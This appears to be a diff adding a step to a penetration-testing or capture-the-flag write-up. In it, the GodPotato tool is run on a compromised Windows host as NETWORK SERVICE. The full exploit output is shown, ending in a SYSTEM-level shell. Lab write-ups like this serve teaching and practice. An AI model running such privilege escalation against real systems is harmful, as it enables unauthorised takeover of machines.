@@ -787,5 +787,37 @@ SHELL>
 This tranferred godpotato to the target
 
 ```python
+SHELL> ./godpotato.exe -cmd "cmd /c whoami"
+[*] CombaseModule: 0x140705258995712
+[*] DispatchTable: 0x140705261301824
+[*] UseProtseqFunction: 0x140705260678352
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\0769db82-3516-492c-b16b-16380feb10a8\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 0000c802-0cdc-ffff-89e2-fc6fe0608d28
+[*] DCOM obj OXID: 0xf7adbad2d4c96063
+[*] DCOM obj OID: 0x3966a93dbd05258a
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 916 Token:0x812  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 3004
+nt authority\system
+SHELL> 
+```
+I am now running as NT authority system
+
+```python
 
 ```
